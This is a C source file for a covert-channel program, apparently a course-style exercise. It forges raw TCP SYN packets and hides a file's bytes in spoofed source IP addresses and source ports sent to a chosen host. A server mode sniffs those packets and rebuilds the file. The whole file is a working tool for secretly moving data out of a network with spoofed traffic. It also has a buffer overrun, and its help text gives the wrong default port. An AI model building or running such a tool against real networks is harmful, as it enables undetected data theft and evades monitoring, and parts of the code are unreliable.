#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define USER_ROOT 0
#define DEST_PORT 8654
#define WINDOW_SIZE 4068
#define DATA_SIZE 5
#define UNREAD 0
#define READ 1
#define BUFFER_SIZE 80
#define SEND_SOCKET 0
#define RECV_SOCKET 1
#define TCP_BUFFER 10000

	struct channel_info {
		int server;
		char desthost[BUFFER_SIZE];
		unsigned int dest_port;
		unsigned int dest_host;
		unsigned int w_size;
		char filename[BUFFER_SIZE];
	} channel_info;

int create_raw_socket(int sock_proto);
void start_covert_channel();
void forge_packet_client(struct in_addr addr, unsigned int forged_src_port);
void decrypt_packet_server();
int close_socket(int sock_d);
int client_file_io();
int server_file_io(char* recv_buffer);
void usage(char *program_name);
unsigned short in_cksum(unsigned short *addr, int len);
unsigned short tcp_in_cksum(unsigned int src, unsigned int dst, unsigned short *addr, int length);
unsigned int host_convert(char *hostname);
char * convert_ip_to_string(struct in_addr addr);

int main(int argc, char **argv)
{
 	channel_info.dest_host = UNREAD;
	channel_info.w_size = WINDOW_SIZE;
	channel_info.dest_port = DEST_PORT;
	channel_info.server = UNREAD;
	size_t i = 0;

	if (geteuid() != USER_ROOT)
	{
		fprintf(stderr, "You need to be root to run this.\n\n");
		exit(0);
	}

	if (argc < 5 || argc > 10)
	{
		usage(argv[0]);
		exit(0);
	}

	for(i = 0; i < argc; i++)
	{
		if (strcmp(argv[i],"-dest") == 0)
		{
			channel_info.dest_host = host_convert(argv[i+1]);
			strncpy(channel_info.desthost, argv[i+1], BUFFER_SIZE - 1);
		}
		else if (strcmp(argv[i],"-dest_port") == 0)
			channel_info.dest_port = atoi(argv[i+1]);
		else if (strcmp(argv[i],"-window-size") == 0)
			channel_info.w_size = atoi(argv[i+1]);
		else if (strcmp(argv[i],"-file") == 0)
		{
			strncpy(channel_info.filename, argv[i+1], BUFFER_SIZE - 1);
		}
		else if (strcmp(argv[i],"-server") == 0)
			channel_info.server = READ;
	}

	start_covert_channel();

	return 0;
}

int create_raw_socket(int sock_proto)
{
	int sock_fd;

	if((sock_proto == SEND_SOCKET) && (sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		perror("Send Socket cannot be created. Are you root?");
		exit(1);
	}
	else if ((sock_proto == RECV_SOCKET) && (sock_fd = socket(AF_INET, SOCK_RAW, 6)) < 0)
	{
		perror ("Receive Socket cannot be created. Are you root?");
		exit(1);
	}
	return sock_fd;
}

void start_covert_channel()
{	
	if(channel_info.server == READ)
		decrypt_packet_server();
	else
		client_file_io();
}

//Function sends the packet
void forge_packet_client(struct in_addr addr, unsigned int forged_src_port)
{
	struct send_pkt
	{
		struct iphdr ip;
		struct tcphdr tcp;
	} send_pkt;

	int send_socket, send_len;
	struct sockaddr_in sin;
	char * data;

	send_pkt.ip.ihl = 5;
	send_pkt.ip.version = 4;
   	send_pkt.ip.tos = 0;
   	send_pkt.ip.tot_len = htons(40);
   	send_pkt.ip.id =(int)(255.0 * rand()/(RAND_MAX+1.0));
	send_pkt.ip.frag_off = 0;
	send_pkt.ip.ttl = 64;
	send_pkt.ip.protocol = IPPROTO_TCP;
	send_pkt.ip.check = 0;
	send_pkt.ip.saddr = addr.s_addr;
	send_pkt.ip.daddr = inet_addr(channel_info.desthost);

	send_pkt.tcp.source = htons(forged_src_port);
	send_pkt.tcp.dest = htons(channel_info.dest_port);
	send_pkt.tcp.seq = 1 + (int)(10000.0*rand()/(RAND_MAX+1.0));
	send_pkt.tcp.ack_seq = 0;
   	send_pkt.tcp.res1 = 0;
   	send_pkt.tcp.res2 = 0;
   	send_pkt.tcp.doff = 5;
   	send_pkt.tcp.fin = 0;
   	send_pkt.tcp.syn = 1;
   	send_pkt.tcp.rst = 0;
   	send_pkt.tcp.psh = 0;
   	send_pkt.tcp.ack = 0;
   	send_pkt.tcp.urg = 0;
   	send_pkt.tcp.window = htons(channel_info.w_size);
   	send_pkt.tcp.check = 0;
   	send_pkt.tcp.urg_ptr = 0;

   	sin.sin_family = AF_INET;
   	sin.sin_port = send_pkt.tcp.source;
   	sin.sin_addr.s_addr = send_pkt.ip.daddr;

   	send_socket = create_raw_socket(SEND_SOCKET);

   	send_pkt.ip.check = in_cksum((unsigned short *)&send_pkt.ip, sizeof(send_pkt));
	send_pkt.tcp.check = tcp_in_cksum(send_pkt.ip.saddr, send_pkt.ip.daddr, 
									 (unsigned short *)&send_pkt.tcp, sizeof(send_pkt.tcp));

	if ((send_len = sendto(send_socket, &send_pkt, 40, 0, (struct sockaddr *)&sin, sizeof(sin))) < 0)
	{
		perror("Trouble sending packets.\n");
		exit(1);
	}
	data = convert_ip_to_string(addr);
	printf("Sending data from embedded IP %s\t = %s\nSending src port %d\t = %c\n", 
		inet_ntoa(addr), data, send_pkt.tcp.source, ntohs(send_pkt.tcp.source));

	close_socket(send_socket);
	free(data);
}

void decrypt_packet_server()
{
	struct recv_tcp
   	{
      struct ip ip;
      struct tcphdr tcp;
      char buffer[TCP_BUFFER];
   	} recv_pkt;	

   	int recv_sock, recv_len;
   	char * data;
  	char src_port_data[2];

   	recv_sock = create_raw_socket(RECV_SOCKET);

   	while(1)
   	{
   		if ((recv_len = read(recv_sock, (struct recv_tcp *)&recv_pkt, TCP_BUFFER)) < 0) {
   			perror("Cannot read socket. Are you root?\n");
   			break;
		}

		if((recv_pkt.tcp.syn == 1) && (ntohs(recv_pkt.tcp.window) == channel_info.w_size))
		{
			data = convert_ip_to_string(recv_pkt.ip.ip_src);
			printf("Receiving Data from Forged Src IP: %s\n", data);
			printf("Receiving Data from Src Port: %c\n", recv_pkt.tcp.source);
			
			sprintf(src_port_data, "%c", ntohs(recv_pkt.tcp.source));

			strcat(data, src_port_data);

			if(server_file_io(data) < 0)
			{
				perror("Cannot write to file\n");
				exit(1);
			}
			free(data);
		}
   	}
   	close_socket(recv_sock);
}

int close_socket(int sock_d)
{
	close(sock_d);
	return 0;
}

int client_file_io()
{
	FILE * input;
	int file_size;
	int file_pos = 0;
	int read_bytes;
	struct sockaddr_in addr;
	char ip_addr[16];
	char rbuffer[DATA_SIZE + 1];

	if((input = fopen(channel_info.filename, "rb")) == NULL)
	{
		fprintf(stderr, "Can't open %s for reading\n", channel_info.filename);
		exit(1);
	}		
	fseek(input, 0, SEEK_END);
	file_size = ftell(input);
	rewind(input);

	for(file_pos = 0; file_pos < file_size; file_pos += read_bytes)
	{
		read_bytes = fread(rbuffer, sizeof(char), DATA_SIZE, input);

		sprintf(ip_addr, "%d.%d.%d.%d", rbuffer[0], rbuffer[1], rbuffer[2], rbuffer[3]);

		inet_aton(ip_addr, &addr.sin_addr);
		addr.sin_port = rbuffer[4];

		forge_packet_client(addr.sin_addr, addr.sin_port);
		usleep(rand() % 50000 + 50000);

		memset(rbuffer, 0, sizeof(rbuffer));
	}
	fclose(input);
	return 0;
}

int server_file_io(char* recv_buffer)
{
	FILE * output;

	if((output = fopen(channel_info.filename, "a+")) == NULL){
		fprintf(stderr, "Cannot open %s for appending.\n", channel_info.filename);
		return -1;
	}
	fprintf(output, "%s", recv_buffer);
	fclose(output);
	return 0;
}
void usage(char *program_name)
{
	printf("Usage: %s -dest dest_ip -dest_port port -window-size window_size -file filename -server \n\n", program_name);
	printf("-dest dest_ip 	  - Host to send data to.\n");
	printf(" 				  	In SERVER mode this is the server ip address\n");
	printf("-dest_port port   - IP source port you want data to go to. In\n");
	printf(" 				    SERVER mode this is the port data will be coming\n");
	printf(" 				    inbound on.\n");
	printf(" 			        If NOT specified, default is port 80.\n");
	printf("-window-size size - Window-size to send/receive (client and server MUST match window-size)\n");
	printf(" 			      	If NOT specified, default is size 4068.\n");
	printf("-file filename 	  - Name of the file to encode and transfer.\n");
	printf("-server 		  - Server mode to allow receiving of data.\n");
	exit(0);
}
unsigned short in_cksum(unsigned short *addr, int len)
{
	int nleft = len;
	int sum = 0;
	unsigned short *w = addr;
	unsigned short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}
	
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}
unsigned short tcp_in_cksum(unsigned int src, unsigned int dst, unsigned short *addr, int length)
{
	struct pseudo_header
    {
      struct in_addr source_address;
      struct in_addr dest_address;
      unsigned char placeholder;
      unsigned char protocol;
      unsigned short tcp_length;
      struct tcphdr tcp;
    } pseudo_header;

	u_short solution;

	memset(&pseudo_header, 0, sizeof(pseudo_header));
	
	pseudo_header.source_address.s_addr = src;
	pseudo_header.dest_address.s_addr = dst;
	pseudo_header.placeholder = 0;
	pseudo_header.protocol = IPPROTO_TCP;
	pseudo_header.tcp_length = htons(length);
	memcpy(&(pseudo_header.tcp), addr, length);

	solution = in_cksum((unsigned short *)&pseudo_header, 12 + length);
	
	return (solution);
}

unsigned int host_convert(char *hostname)
{
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cannot resolve %s\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
}
char * convert_ip_to_string(struct in_addr addr)
{
	char * ip_str = inet_ntoa(addr);
	char * data = malloc((DATA_SIZE + 1) * sizeof(char));
	size_t i;

	data[0] = atoi(strtok(ip_str, "."));

	for(i = 1; i < DATA_SIZE - 1; i++)
		data[i] = atoi(strtok(NULL, "."));

	return data;
}